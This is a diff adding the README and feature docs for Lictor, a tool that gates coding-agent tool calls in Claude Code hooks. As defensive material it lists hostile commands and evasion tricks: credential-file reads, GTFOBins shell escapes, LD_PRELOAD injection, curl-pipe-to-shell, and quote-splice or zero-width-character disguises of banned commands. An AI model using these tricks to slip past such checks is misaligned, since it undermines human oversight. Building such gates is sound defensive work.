@@ -1,0 +1,1701 @@
+# Lictor
+
+<img src="docs/logo.png" align="left" width="180" hspace="26" vspace="12" alt="A Roman lictor bearing the fasces — the rods-and-axe mark of enforcing authority">
+
+Policy gate for coding-agent tool calls. One Rust binary in Claude Code's `PreToolUse`/`PostToolUse` hooks, configured in TOML.
+
+A **lictor** was the Roman officer who walked ahead of a magistrate and enforced his orders on the spot. Same job here — walks in front of every tool call, stops the ones that shouldn't pass.
+
+> _Designed by human, coded by Claude._
+
+<br clear="left">
+
+## Why
+
+Agent permission systems are prefix matchers. I got tired of that:
+
+- can't say "allow `git push`, deny `git push --force`"
+- `echo ok && git commit` walks right past a `git commit` rule
+- deny is a silent wall — the agent doesn't know *why*, so it retries variants until something slips through
+- zero control over output: `cargo test` dumps 3 000 lines into the context, model forgets what it was doing, re-runs the suite because the output scrolled away
+
+End state: you either click "approve" all day or turn the checks off. Lictor is the third option — a real policy engine in the hook layer.
+
+## What it does
+
+- **gates** — commands parsed with [tree-sitter-bash](https://github.com/tree-sitter/tree-sitter-bash), every command in a chain judged individually: pipes, subshells, `$(...)`, `bash -c "..."`, `eval`, loop bodies. Can't prove it statically → [fail closed](docs/features/fail-closed.md) to a prompt.
+- **talks back** — [deny](docs/features/deny.md) reasons and [warn](docs/features/warn.md) hints are your words, handed to the agent verbatim. Blocked agent with a reason corrects in one turn; blocked agent without one brute-forces variants.
+- **rewrites** — fix instead of block: `grep` → `rg` ([rewrite](docs/features/rewrite.md)), `mv` of a tracked file → `git mv` ([modules](docs/features/modules.md)). Result is re-gated, so a rewrite can't smuggle past a ban.
+- **gates file edits too** — by path + content: what's added, what's deleted, what must be present ([edit rules](docs/features/edit-rules.md)).
+- **gates URLs** — domain allowlists and extension denylists for `curl`/`wget`/`WebFetch`, or reroute a fetch through a markdown proxy ([web rules](docs/features/web.md)). Subagent prompts and outputs get regex rules too ([agent rules](docs/features/agent.md)).
+- **mode-aware** — one shared rule, different action per permission mode: `modes = { plan = "allow", auto = "deny" }`; remap final decisions per mode, or flip to a deny-by-default allowlist ([modes](docs/features/modes.md)).
+- **shrinks output** — [minify](docs/features/minify.md) noisy CLIs, [spill](docs/features/spill.md) oversized output to a local cache; the model gets the tail + a retrieval command instead of 3 000 lines.
+
+| agent runs | lictor decides |
+|---|---|
+| `echo ok && git commit -m wip` | **deny** — "Commits are manual…" (ban found inside the chain) |
+| `bash -c "gi''t commit"` | **deny** — payload parsed, quote-splice resolved |
+| `grep -r TODO src/` | **rewrite** → `rg TODO src/`, auto-approved |
+| `mv src/a.ts src/b.ts` | **rewrite** → `git mv src/a.ts src/b.ts` (file is git-tracked) |
+| `curl -sSL https://docs.rs/regex \| jq .` | **allow** — every URL on an allowed domain, statically verified |
+| `wget https://github.com/x/archive.zip` | **deny** — "no downloading archives…" (extension beats domain allow) |
+| `cat ~/.zshrc` | **ask** — path outside the project jail |
+| `git $ACTION` | **ask** — dynamic arg defeats the ban check, fail closed |
+| `cargo test` (3 400 lines) | output **spilled** to `kv`; model sees the tail + a `kv get` note |
+
+## Quick start
+
+```sh
+brew install sladg/tap/lictor
+```
+
+Or with Rust 1.85+: `cargo install --git https://github.com/sladg/lictor`.
+
+```sh
+lictor init --write            # starter lictor.toml + the hooks snippet for settings.json
+lictor check                   # validate config (a broken config fails closed: everything asks until this passes)
+lictor check -- <command...>   # dry-run one command through the exact hook pipeline
+lictor check --mode auto -- …  # dry-run as a specific permission mode
+lictor gain                    # audit-log summary: decisions + tokens/bytes saved
+```
+
+`lictor init` prints the hooks block to paste into `.claude/settings.json` (or `~/.claude/settings.json`): `PreToolUse` for Bash, the file-edit tools, `WebFetch` (web rules), and `Task` (agent rules); `PostToolUse` for output minify and agent-output rules. Optional companions: [`kv`](https://github.com/AmrSaber/kv) for spill (`brew install AmrSaber/tap/kv`) and [`rtk`](https://github.com/rtk-ai/rtk) for wrap. Without `kv`, spill falls back to plain truncation — nothing is lost. `wrap` rules rewrite unconditionally, so only write them for tools you actually have installed.
+
+Dry-run anything before trusting it:
+
+```
+$ lictor check -- 'echo ok && git commit -m wip'
+lictor: deny — Commits are manual — propose a commit message and wait for the user.
+
+$ lictor check -- 'seq 1 900'
+lictor: allow
+lictor: output shrunk 3492 → 267 bytes
+```
+
+## Configuration
+
+Everything lives in `lictor.toml`. Configs chain — user file (`~/.config/lictor/config.toml`, or `$XDG_CONFIG_HOME`), then `.claude/lictor.toml` / `lictor.toml` in every directory from the filesystem root down to cwd — so a monorepo root config applies in every package. Rule lists concatenate, deeper files win per key, deny beats allow — a project file can't unban a user-level ban.
+
+```toml
+[settings]
+catalogs = ["recommended"]        # ~150 commands gated in one line
+spill_lines = 800                 # oversized output -> kv cache + retrieval note
+jail = "ask"                      # paths outside the repo -> prompt
+
+[[bash]]
+match  = "git commit*"            # word-wise glob, checked against every command in a chain
+action = "deny"                   # allow | deny | ask | rewrite | warn | log | skip
+reason = "Commits are manual — propose a commit message and wait for the user."
+
+[[edit]]
+paths   = ["**/*.ts", "**/*.tsx"]
+pattern = "as (any|never|unknown)"   # regex over written content
+action  = "deny"
+hint    = "No type assertions — fix the type design instead."
+
+[[web]]
+domains = ["docs.rs", "github.com", "*.github.com"]
+action  = "ask"                           # one shared rule…
+modes   = { plan = "allow", auto = "deny" }  # …different action per permission mode
+```
+
+Full annotated config: [`examples/lictor.toml`](examples/lictor.toml). Every command each catalog covers: [`src/catalogs/builtin.toml`](src/catalogs/builtin.toml).
+
+## Features
+
+One short doc per feature — what it does, config, and exactly what happens when the agent runs something:
+
+| Area | Docs |
+|---|---|
+| Actions | [allow](docs/features/allow.md) · [deny](docs/features/deny.md) · [ask](docs/features/ask.md) · [warn](docs/features/warn.md) · [rewrite](docs/features/rewrite.md) · [log](docs/features/log.md) · [skip](docs/features/skip.md) |
+| Rule types | [catalogs](docs/features/catalogs.md) · [edit rules](docs/features/edit-rules.md) · [path rules](docs/features/path-rules.md) · [web rules](docs/features/web.md) · [agent rules](docs/features/agent.md) · [retries](docs/features/retries.md) |
+| Guards | [jail](docs/features/jail.md) · [strikes](docs/features/strikes.md) · [detectors](docs/features/detectors.md) · [fail-closed](docs/features/fail-closed.md) · [modes](docs/features/modes.md) |
+| Output & context | [minify](docs/features/minify.md) · [spill](docs/features/spill.md) |
+| Helpers | [modules](docs/features/modules.md) · [activate](docs/features/activate.md) |
+
+## Recipes
+
+Worked policies for common scenarios — [`docs/use-cases/`](docs/use-cases/):
+
+| Recipe | You get |
+|---|---|
+| [Read-only auto-approve](docs/use-cases/read-only-autoapprove.md) | ~150 read/query commands run without prompts; anything mutating still asks |
+| [Git write-ban](docs/use-cases/git-write-ban.md) | agent reads history freely; commit/stash/reset/checkout/push stay manual, chain-proof |
+| [TypeScript discipline](docs/use-cases/typescript.md) | no `eslint-disable`/`@ts-ignore`/`as any`, project scripts over `npx tsc`, quiet lint output |
+| [Protect docs & tests](docs/use-cases/protect-docs-and-tests.md) | edits that delete doc-comments or test cases warn or bounce |
+| [Markdown frontmatter](docs/use-cases/markdown-frontmatter.md) | every `.md` the agent writes carries `created_at:`/`updated_at:`, bumped on each edit |
+| [Search discipline](docs/use-cases/search-discipline.md) | `grep`/`find`/`ack` denied with a hint that teaches `rg` |
+| [Temp & scratch hygiene](docs/use-cases/temp-and-scratch.md) | `/tmp` banned in every form (args, redirects, env values); big output cached in `kv` |
+
+## Threat model
+
+Defense-in-depth against a sloppy or manipulated agent, not a sandbox — no process isolation. Lictor decides what the permission system sees; the permission prompt stays the last line. Details: [fail-closed](docs/features/fail-closed.md).
+
+## License
+
+[MIT](./LICENSE)
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Activate
+
+When a command fails with *command not found* and a toolchain marker file sits in cwd, the agent is told how to activate the toolchain and retry. Use it with version managers (proto, nvm, asdf) — otherwise the agent sees `bun: command not found` and starts installing things globally instead of running one activation command.
+
+Hooks can't silently re-run a failed command, so this is guidance, not magic — but the agent follows it in one turn.
+
+## Config
+
+```toml
+[[activate]]
+file  = ".prototools"
+run   = "proto use"
+tools = ["node", "npm", "npx", "pnpm", "yarn", "bun", "tsc", "uv", "go"]
+
+[[activate]]
+file  = ".nvmrc"
+run   = "nvm use"
+tools = ["node", "npm", "npx", "yarn"]
+```
+
+## What happens
+
+```
+bun run build     (.prototools in cwd, bun not on PATH)
+→ exits 127: "bun: command not found"
+→ agent's context gets: "`bun` did not resolve. This project pins toolchains via
+  `.prototools` — run `proto use`, then retry the command."
+→ agent runs `proto use`, retries, moves on
+
+cargo build       (not in the tools list)
+→ plain command-not-found, no hint
+```
+
+Pairs with the `path-check` [module](modules.md), which flags a guaranteed-unresolvable program *before* the run and includes the activation command in its hint when a marker file is present.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Agent rules
+
+`[[agent]]` rules run a regex over subagent traffic (the `Task`/`Agent` tool). `on = "prompt"` gates **before launch** — deny/ask/warn. `on = "output"` matches the **returned result** — hint only (`warn`/`log`), because the work already happened; the hint lands as context next to the result.
+
+## Config
+
+```toml
+[[agent]]
+pattern = "(?i)comprehensive analysis|deep dive"
+on = "output"
+action = "warn"
+hint = "subagent output smells like filler — ask for specifics"
+
+[[agent]]
+pattern = "(?i)delete all|rm -rf"
+on = "prompt"
+action = "deny"
+reason = "destructive subagent prompt"
+```
+
+## What happens
+
+```
+Task("please delete all failing tests")   → blocked before the subagent spawns
+Task("review src/lib.rs")                 → runs
+  ↳ returns "A Comprehensive Analysis…"   → hint: "subagent output smells like filler"
+```
+
+Per-rule `modes` maps apply here too: `modes = { auto = "deny" }` on a prompt rule hard-stops in unattended runs what merely warns elsewhere.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# allow
+
+Auto-approves a matching command — no permission prompt. Use it for commands you'd approve every time anyway (read-only stuff, your dev loop), so the agent keeps moving and you stop clicking.
+
+## Config
+
+```toml
+[[bash]]
+match = "git status*"
+action = "allow"
+
+[[bash]]
+match = "rg*"
+action = "allow"
+
+[[bash]]
+match = "bun run*"
+action = "allow"
+```
+
+## What happens
+
+Simple cases:
+
+```
+git status                    → runs, no prompt
+bun run lint                  → runs, no prompt
+sudo git status               → prompt (wrapper variants count separately)
+```
+
+Chains, pipes, loops — the allow only holds when **every** command in the structure is vetted:
+
+```
+git status | rg modified               → runs, no prompt (both pipe stages vetted)
+for d in a b; do git status; done      → runs, no prompt (loop decomposed, body vetted)
+git status && rm -rf dist              → prompt (rm isn't vetted — one bad link breaks the chain)
+git status && curl https://example.com → prompt (curl asks; chain inherits the strictest member)
+```
+
+Redirects break the "read-only" claim, so they break the allow:
+
+```
+git status > out.txt          → no opinion — the normal permission flow decides
+git status 2>&1               → runs, no prompt (fd dup is harmless)
+rg TODO > /dev/null           → runs, no prompt (/dev/null target is harmless)
+```
+
+Deny always beats allow — an `allow` in a project config can't unban a user-level `deny`.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# ask
+
+Forces the permission prompt, with your `reason` as the dialog text. Use it for things you want to see case-by-case — network access, package installs, production surface — instead of banning or blanket-allowing them.
+
+## Config
+
+```toml
+[[bash]]
+match = "curl*"
+action = "ask"
+reason = "Outbound network access."
+
+[catalog.prod-surface]
+match = ["terraform apply", "flyctl deploy", "kubectl * -n prod*"]
+action = "ask"
+reason = "Production surface — confirm."
+```
+
+## What happens
+
+Simple cases:
+
+```
+curl https://api.example.com  → prompt: "Outbound network access." — you approve or reject
+terraform apply               → prompt: "Production surface — confirm."
+```
+
+A chain inherits its strictest member — one ask-worthy command anywhere and the whole call prompts:
+
+```
+git status && curl https://example.com   → prompt (git status alone would auto-run)
+ls | xargs rm                            → prompt: "Filesystem mutation." (rm unwrapped from xargs)
+for f in *.json; do curl -T $f https://x; done   → prompt (loop body gated)
+```
+
+`ask` is also the fail-closed default for everything static analysis can't prove:
+
+```
+CMD=git; $CMD stash list      → prompt (dynamic program name — can't verify against the stash ban)
+eval "$PAYLOAD"               → prompt (opaque)
+python -c "import os; …"      → prompt (inline script, on_inline_script = ask)
+```
+
+The starter policy ships `[modes.auto.remap] ask = "deny"`: in `auto` mode every `ask` becomes `deny` — nobody's there to answer the dialog, and a deny gives the agent a reason it can act on instead of a stalled turn. See [modes](modes.md).
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Catalogs
+
+A catalog is a named group of commands sharing one config block — gate ~150 commands without writing 150 rules. Built-ins ship in the binary ([`src/catalogs/builtin.toml`](../../src/catalogs/builtin.toml)); bundles activate curated sets.
+
+## Config
+
+```toml
+[settings]
+catalogs = ["recommended"]   # bundle: *-read → allow, net/mutating/pkg-install → ask,
+                             # secrets/destructive/gtfobins/obfuscation → deny
+                             # also: "read-only" (just the allows) | "paranoid" (stricter)
+
+[catalog.net-egress]         # mention a built-in to activate/override it
+action = "deny"
+
+[catalog.git-read]           # tweak membership
+add    = ["git worktree list"]
+remove = ["git grep"]
+
+[catalog.prod-surface]       # or define your own group
+match  = ["terraform apply", "flyctl deploy", "kubectl * -n prod*"]
+action = "ask"
+reason = "Production surface — confirm."
+```
+
+## What happens
+
+With `catalogs = ["recommended"]`:
+
+```
+ls, cat src/x.rs, git diff, docker ps   → run, no prompt (read catalogs → allow)
+rm src/x.rs, npm install left-pad       → prompt (mutating / pkg-install → ask)
+cat .env, shred file, git push --force  → blocked (secrets-read / destructive → deny)
+cat .env                                → deny wins over text-read's allow — most-restrictive, no ordering rules
+```
+
+Carve an exception out of a catalog's blanket action with a narrow [`skip`](skip.md) rule (lictor steps aside, Claude Code's own rules decide):
+
+```toml
+[[bash]]
+match = "rm .claude/scratch/*"
+action = "skip"
+```
+
+## Built-in catalogs
+
+| Catalog | Default | Covers (examples) |
+|---|---|---|
+| `shell-core` | allow | `echo printf read cd true false test [ : seq sleep` |
+| `fs-read` | allow | `ls tree eza stat file du df realpath readlink basename dirname pwd which type` |
+| `text-read` | allow | `cat head tail nl less strings od xxd grep rg sort uniq cut tr diff wc jq yq sed` (plain `sed`; `-i` routes to `mutating`) |
+| `sysinfo` | allow | `uname nproc uptime free lscpu printenv date whoami id groups hostname sw_vers` |
+| `proc-read` | allow | `ps pgrep pstree pmap lsof` |
+| `net-query` | allow | `dig host nslookup ss ping traceroute mtr whois getent` |
+| `git-read` | allow | `git status/log/diff/show/blame/ls-files/rev-parse/branch --list/config --get …` |
+| `gh-read` | allow | `gh pr/issue/run/repo/release list+view`, `gh auth status`, `gh search` |
+| `docker-read` | allow | `docker ps/images/inspect/logs/top/history/version/info/diff` |
+| `kubectl-read` | allow | `kubectl get/describe/logs/top/explain/version/config view/auth can-i` |
+| `helm-read` | allow | `helm list/status/get/show/history/search/template/lint` |
+| `tf-read` | allow | `terraform validate/fmt -check/show/output/state list/providers/graph` |
+| `svc-read` | allow | `systemctl status/list-*/is-*/show/cat`, `journalctl`, `launchctl list` |
+| `pkg-query` | allow | `npm/pnpm/pip/uv/cargo/brew/apt/gem … list/show/outdated/search` |
+| `kv-cache` | allow | `kv` (all subcommands) — the cache behind spill; disposable local store, not a source of truth |
+| `net-egress` | ask | `curl wget http https nc ncat telnet` |
+| `mutating` | ask | `rm mv cp ln mkdir rmdir touch chmod chown tee truncate` |
+| `pkg-install` | ask | `npm/pnpm/yarn/bun/pip/uv/cargo/brew/apt/gem … install/add/remove/upgrade` |
+| `secrets-read` | deny | readers (`cat less head tail bat grep rg sed …`) hitting `*.env* *.pem *.key *id_rsa* .aws/credentials .ssh/* .npmrc .netrc .kube/config` |
+| `destructive` | deny | `shred mkfs* fdisk parted wipefs`, `dd of=/dev/*`, `rm` on `/ ~ --no-preserve-root`, `git push --force`, `DROP DATABASE/TABLE` |
+| `gtfobins` | deny | shell-escape flag vectors: `tar --checkpoint-action`, `awk 'BEGIN{system()}'`, `git -c core.pager=`, `ssh -o ProxyCommand`, `sqlite3 .shell`, `vim -c`, … |
+| `obfuscation` | deny | **structural** detector (invisible chars, undecodable escapes, fork bomb) — routes to `on_obfuscation`, not a pattern list |
+| `interactive` | ask | binaries that can spawn a shell via a typed escape: `less more man vi vim nano gdb ftp ed …` |
+| `noisy-build` | minify | `cargo build/test/clippy`, `npm/pnpm run build`, `go build/test`, `vitest tsc make` → output truncation (no gate action) |
+| `search-nudge` | warn | `grep find sed` → hint to prefer `rg`/`rg --files`; grants no permission, doesn't change any decision |
+
+`kv-cache` covers the [kv](https://github.com/AmrSaber/kv) CLI that [spill](spill.md) stores output in — it's not a system tool, install it with `brew install AmrSaber/tap/kv`.
+
+## Bundles (`settings.catalogs`)
+
+| Bundle | Contents |
+|---|---|
+| `read-only` | the 16 `*-read`/query/nudge catalogs → **allow** (`search-nudge` is warn-only), nothing else |
+| `recommended` | `read-only` **+** `net-egress`/`mutating`/`pkg-install` → ask, `secrets-read`/`destructive`/`obfuscation`/`gtfobins` → deny |
+| `paranoid` | `recommended` but `net-egress` and `mutating` → **deny**, plus `interactive` → ask |
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# deny
+
+Blocks a matching command and hands your `reason` to the agent verbatim. Use it for hard bans — the reason is what makes the agent stop trying variants and do the right thing instead.
+
+## Config
+
+```toml
+[[bash]]
+match = "git commit*"
+action = "deny"
+reason = "Commits are manual — propose a commit message and wait for the user."
+
+[[bash]]
+match = "git add*"
+action = "deny"
+reason = "Staging is manual — the user stages and commits."
+
+[[bash]]
+match = "git push"
+contains = ["--force", "-f"]   # flag-level ban; plain `git push` unaffected
+action = "deny"
+reason = "Force pushes are banned."
+```
+
+## What happens
+
+Simple cases:
+
+```
+git commit -m wip             → blocked; agent reads: "Commits are manual — propose a commit message…"
+git push --force              → blocked; git push → untouched
+/usr/bin/git commit           → blocked (path-qualified git == git)
+git -C /elsewhere commit      → blocked (global flags unwrapped)
+```
+
+The ban is found wherever the command hides — chains, pipes, substitution, loop and conditional bodies, `find -exec`:
+
+```
+echo ok && git commit -m x                → blocked (chain member gated individually)
+echo $(git commit -m x)                   → blocked (inside command substitution)
+bash -c "git commit"                      → blocked (payload parsed)
+eval 'git add -A'                         → blocked
+while true; do git add .; done            → blocked (loop body decomposed)
+if [ -f x ]; then git stash; fi           → blocked (conditional body decomposed)
+find . -name "*.rs" -exec git add {} \;   → blocked (-exec payload gated)
+```
+
+What can't be proven doesn't slip through — it escalates:
+
+```
+CMD=git; $CMD stash list      → prompt: "cannot statically verify `<dynamic> stash list` against rule `git stash*`"
+git $ACTION                   → prompt (dynamic arg defeats the ban check, fail closed)
+```
+
+Deny is the strongest action: it wins over allow/ask/warn from any other matching rule, in any config file.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Detectors
+
+Structural checks that don't need a rule to match — they fire on *how* a command is built, not what it's named. Use the defaults; loosen or tighten per setting. All under `[settings]`.
+
+| Setting | Default | Fires on |
+|---|---|---|
+| `on_obfuscation` | deny | invisible/zero-width/bidi chars, undecodable `$'\x..'` escapes, fork bombs |
+| `on_dangerous_env` | deny | code-injecting env prefixes: `LD_PRELOAD=…`, `BASH_ENV=…`, `GIT_SSH_COMMAND=…` |
+| `on_inline_script` | ask | opaque interpreter payloads: `python -c`, `node -e`, `curl x \| sh`, heredoc-fed shells |
+| `on_unparseable` | ask | commands tree-sitter can't parse, nesting deeper than 5 |
+| `on_shell_write` | off | authoring files via redirection: `echo x > f`, `cat > f <<EOF` |
+| `strip_program_paths` | off | `/usr/local/bin/rg` → `rg`, `./node_modules/.bin/tsc` → `tsc` (set to `rewrite`) |
+
+Writes to raw disk devices (`> /dev/sda`, `dd of=/dev/nvme0n1`) are always denied — not configurable.
+
+## Config
+
+```toml
+[settings]
+on_obfuscation = "deny"
+on_inline_script = "ask"
+on_shell_write = "deny"          # author files with Write/Edit, not `echo > f`
+strip_program_paths = "rewrite"
+```
+
+## What happens
+
+```
+$'\x67'it commit               → escapes decoded first → hits the normal `git commit` ban
+gi​t commit  (zero-width char)  → blocked outright (obfuscation)
+LD_PRELOAD=./evil.so ls        → blocked (dangerous env)
+python -c "import os; …"       → prompt (inline script)
+echo '#!/bin/sh…' > run.sh     → blocked: use the Write tool (on_shell_write = deny)
+/usr/local/bin/rg TODO         → runs as `rg TODO` (path stripped)
+```
+
+The GTFOBins-style flag vectors (`tar --checkpoint-action=exec=sh`, `git -c core.pager=…`, `awk 'BEGIN{system(…)}'`) live in the `gtfobins` [catalog](catalogs.md), deny by default in the `recommended` bundle.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Edit rules
+
+Gate the file-authoring tools (`Edit`/`Write`/`MultiEdit`/`NotebookEdit`) by path glob plus content regexes — in three directions. Use them for the stuff bash rules can't see: what the agent writes *into* files.
+
+| Field | Fires when… |
+|---|---|
+| `pattern` | written content **matches** — gate what's added |
+| `removed_pattern` | old content matched, new doesn't — gate what's deleted |
+| `required_pattern` | written content is **missing** the regex — demand boilerplate |
+
+All specified conditions must hold. Actions are the same as bash rules (`deny`/`ask`/`warn`/`allow`/`log`/`skip`).
+
+## Config
+
+```toml
+[[edit]]
+paths = ["**/*.ts", "**/*.tsx"]
+pattern = "as (any|never|unknown)"
+action = "deny"
+hint = "No type assertions — fix the type design instead."
+
+[[edit]]
+paths = ["**/*.test.ts"]
+removed_pattern = '(?m)^\s*(it|test|describe)\('
+action = "deny"
+hint = "Never delete test cases — refactor them, or ask the user per case."
+
+[[edit]]
+paths = ["docs/**/*.md"]
+required_pattern = '(?m)^updated_at: \d{4}-\d{2}-\d{2}'
+action = "deny"
+hint = "Bump `updated_at:` in the frontmatter as part of this edit."
+```
+
+## What happens
+
+```
+Edit adds `res as any`                     → blocked; hint tells it to fix the type
+Edit deletes an it(...) block              → blocked; test survives
+Write docs/x.md without updated_at:        → blocked (Write = full content checked)
+Edit docs/x.md, body only                  → blocked (Edit = new_strings checked; none carries updated_at)
+MultiEdit: body change + updated_at bump   → passes (any pair satisfying the pattern is enough)
+Write with no old content                  → removed_pattern never fires (nothing was deleted)
+```
+
+Worked examples: [markdown frontmatter](../use-cases/markdown-frontmatter.md), [TypeScript discipline](../use-cases/typescript.md), [protect docs & tests](../use-cases/protect-docs-and-tests.md).
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Fail closed
+
+Anything that defeats static analysis escalates to the permission prompt instead of slipping through. This is the default posture, not a rule you write — lictor never guesses and never executes a command to analyze it.
+
+## What escalates
+
+```
+eval "$X", bash -c "$PAYLOAD"        → prompt (opaque payload)
+$CMD commit                          → prompt (dynamic program name)
+git push $FLAGS   (vs --force ban)   → prompt (can't verify the ban against a dynamic arg)
+python -c "…", curl x | sh, heredocs → prompt (inline scripts, on_inline_script = ask)
+unparseable command, nesting > 5     → prompt (on_unparseable = ask)
+broken lictor.toml                   → every call prompts, parse error as the reason, until `lictor check` passes
+```
+
+## What stays a hard deny
+
+```
+gi​t commit  (zero-width char)        → blocked (structural obfuscation — invisible/bidi chars, undecodable escapes)
+$'\x67'it commit                     → decodable escape resolved first → hits the normal `git commit` ban
+echo "EXIT: $?"  (vs '*$\?*' ban)    → blocked (a banned token appearing literally inside a dynamic word is definite)
+```
+
+## Conservative by design
+
+- loops and conditionals are decomposed, not trusted — every command in `for`/`while`/`if`/`case` bodies and function definitions is gated individually
+- auto-approval needs the whole chain vetted: `git status && rm x` is not covered by a `git status` allow
+- wrapper variants count separately: `sudo git status` ≠ `git status`
+- an output redirect (`> file`) disqualifies a command from auto-allow — a read-only command that writes a file isn't read-only
+
+## Threat model
+
+Defense-in-depth against a sloppy or manipulated agent, not a sandbox — there is no process isolation. Lictor decides what the permission system sees; the permission prompt stays the last line.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Jail
+
+Confines the agent to the project: literal paths outside the repo (and your allowed roots) get warn/ask/deny. Use it so "the agent works on my repo" actually means the repo — not your dotfiles, not `/etc`.
+
+The project root is the git repo containing cwd (`git rev-parse --show-toplevel`), so the agent moves freely anywhere inside the repo even after `cd`-ing around; outside a repo it falls back to plain cwd. A `cd` earlier in a chain shifts what later relative paths resolve against; a subshell's `cd` (`bash -c`, `eval`, `find -exec`) doesn't leak out; `cd -` or a dynamic target freezes tracking at the last known cwd rather than guessing. Resolution is lexical — `~` expanded, `..` collapsed, no symlink or `$VAR` resolution.
+
+## Config
+
+```toml
+[settings]
+jail = "ask"                                        # warn | ask | deny
+jail_allow = ["~/Downloads", "~/.cargo/registry"]   # extra roots that are fine
+```
+
+## What happens
+
+```
+cat src/main.rs               → silent (inside the repo)
+cat /etc/hosts                → prompt: outside the project jail
+cp x ~/Documents/y            → prompt
+cat ~/Downloads/data.csv      → silent (allowed root)
+cd .. && cat ../secret        → checked against the post-cd directory, not the original cwd
+grep x $HOME/.zshrc           → dynamic path — the jail reads literals; $VARs are the fail-closed machinery's job
+```
+
+The agent is told *why*, so it self-corrects: `lictor: '/etc/hosts' is outside the project jail — stay in the repo or have the user extend settings.jail_allow`.
+
+For unattended sessions, harden it per mode ([modes](modes.md)): `[modes.auto.settings] jail = "deny"`.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# log
+
+Audit-only: records the match in the audit log, decides nothing — the command runs (or prompts) exactly as it would without the rule. Use it when you want visibility before opinion: watch what the agent actually does with a tool for a week, then write the real rule.
+
+## Config
+
+```toml
+[settings]
+log_file = "~/.local/state/lictor/audit.jsonl"   # required — no log_file, no entries
+
+[[bash]]
+match = "gh *"
+action = "log"
+```
+
+## What happens
+
+```
+gh pr list                    → runs as normal; a JSONL entry lands in the audit log
+gh pr merge 42                → same — log grants nothing and blocks nothing
+```
+
+`lictor gain` summarizes the log: decisions, rule-log matches, minify/spill bytes saved.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Minify
+
+Shapes what the model sees after a command runs — wrap it in a token-efficient proxy, pipe the output through a filter, or truncate it. Use it on noisy CLIs (builds, tests, `git log`, `kubectl`): the model needs the signal, not 400 lines of progress bars.
+
+Three mechanisms, one `[[minify]]` block each:
+
+| Field | Does |
+|---|---|
+| `wrap` | rewrite the command to run under a proxy: `git log` → `rtk git log` |
+| `pipe` | filter captured stdout through any stdin→stdout program |
+| `max_lines` / `min_lines` / `preserve` | built-in head+tail truncation; `preserve` regexes keep matching lines |
+
+## Config
+
+```toml
+[[minify]]
+match = "git log*"
+wrap  = "rtk"            # git log → rtk git log
+allow = true             # …and auto-approve the wrapped command
+
+[[minify]]
+match = "cargo test*"
+wrap  = "tokf run --"    # cargo test → tokf run -- cargo test
+allow = true
+
+[[minify]]
+match = "npm install*"
+pipe  = "tail -20"       # model sees the last 20 lines
+
+[[minify]]
+match = "vitest*"
+max_lines = 80
+preserve  = ["(?i)error", "(?i)fail"]   # error lines survive truncation
+```
+
+## What happens
+
+```
+git log --oneline -20         → runs as `rtk git log --oneline -20`, no prompt (allow = true)
+cargo test                    → runs as `tokf run -- cargo test`; model sees the filtered result
+npm install                   → runs normally; model sees only the last 20 lines
+vitest run  (500 lines)       → model sees head+tail within 80 lines, every error line kept
+git log > log.txt             → wrap skipped (redirect disqualifies wrap and auto-allow)
+```
+
+Safety valve: a `pipe` filter that fails or changes nothing leaves the output untouched — output is never lost. For the "too big" case there's [spill](spill.md).
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Modes
+
+Rules can differ per `permission_mode` — `default`, `plan`, `acceptEdits`, `auto`, `dontAsk`, `bypassPermissions`. Three primitives, least to most sweeping:
+
+1. **Per-rule `modes` map** — one shared pattern, mode-specific action. No duplication.
+2. **`[modes.<mode>]` overlay** — extra rules/settings that exist only in that mode.
+3. **`[modes.<mode>.remap]`** — rewrites the *final* decision, applied after everything else.
+
+Plus **allowlist fallbacks**: `default_bash` / `default_edit` / `default_web` decide when *no* rule matched.
+
+## Per-rule modes map
+
+Every `[[bash]]` / `[[edit]]` / `[[path]]` / `[[web]]` / `[[agent]]` rule and `[catalog.*]` block takes it:
+
+```toml
+[[web]]
+domains = ["docs.rs", "github.com"]
+action = "ask"                            # base behavior
+modes = { plan = "allow", auto = "deny" } # research freely while planning; never unattended
+
+[catalog.mutating]
+modes = { plan = "deny" }                 # no mutations while planning
+```
+
+## Overlay
+
+A `[modes.<mode>]` block is one more config layer: settings override, rule lists append, most-restrictive still wins across base + overlay.
+
+```toml
+[modes.bypassPermissions.settings]
+jail = "deny"                     # nothing's watching → hard-confine to the repo
+
+[[modes.auto.bash]]
+match = "curl*"
+action = "deny"
+reason = "auto mode: no unattended network access"
+```
+
+## Remap
+
+Final-decision lookup. Keys are the decisions (`allow`/`ask`/`deny`) plus `warn` (the emitted hints); applied last, after rules, modules, and defaults.
+
+```toml
+[modes.auto.remap]
+ask = "deny"                      # nobody to answer a dialog — shipped in the starter policy
+warn = "skip"                     # drop hints too: fully binary decisions
+
+[modes.acceptEdits.remap]
+ask = "warn"                      # demote prompts to hints while babysitting edits
+```
+
+## Allowlist lockdown
+
+`default_*` close the no-rule-matched hole — lictor flips from blocklist to allowlist:
+
+```toml
+[modes.plan.settings]
+default_bash = "deny"             # unmatched command → denied
+default_edit = "deny"             # unmatched write → denied
+default_web = "deny"              # unmatched WebFetch URL → denied
+
+[[modes.plan.edit]]
+paths = ["**/*.md"]               # the plan file is the only writable thing
+action = "allow"
+```
+
+Read-only allows from the `recommended` bundle still pass — plan mode can read code and research, write only markdown.
+
+## What happens
+
+```
+(plan mode)  Write plan.md                → runs (edit allow rule)
+(plan mode)  Write src/main.rs            → blocked (default_edit)
+(plan mode)  curl https://docs.rs/regex   → runs (web rule, plan = "allow")
+(auto mode)  curl https://docs.rs/regex   → blocked (web rule, auto = "deny")
+(auto mode)  git push                     → ask becomes deny (remap), reason preserved
+```
+
+## Mode names
+
